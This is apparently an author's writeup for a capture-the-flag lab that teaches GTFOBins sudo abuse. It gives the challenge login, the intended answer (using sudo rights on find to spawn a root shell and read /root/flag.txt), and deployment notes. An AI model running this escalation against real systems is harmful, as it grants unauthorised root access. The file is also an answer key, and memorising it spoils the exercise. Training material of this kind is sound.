# gtfobins-sudo writeup (for author)

## Purpose
Train GTFOBins usage. User has sudo rights only for one binary.

## Access
- SSH: user `ctf`, pass `ctf123`
- CTFd shows `ssh ctf@ip -p port`

## Intended path
1) Check sudo rights:
```
sudo -l
```
2) See allowed binary: `/usr/bin/find`.
3) Use GTFOBins to get a root shell:
```
sudo find . -exec /bin/sh \; -quit
```
4) Read flag:
```
cat /root/flag.txt
```

## Flag location
- Real flag is stored in `/root/flag.txt` (root-only).

## Hardening notes
- `su` locked down.
- All SUID bits stripped.
- Sudo only for `/usr/bin/find`.

## Files (prod)
- `ctfd/Dockerfile`
- `ctfd/entrypoint.sh`
- `ctfd/docker-compose.yml`

## Files (test)
- `test/Dockerfile`
- `test/entrypoint.sh`
- `test/docker-compose.yml`

## What to change before prod
- Replace `FLAG` value in CTFd config (platform will inject).
- Update `CTF_USER`/`CTF_PASS` if needed.
- Optional: update MOTD/WELCOME hints in `entrypoint.sh`.
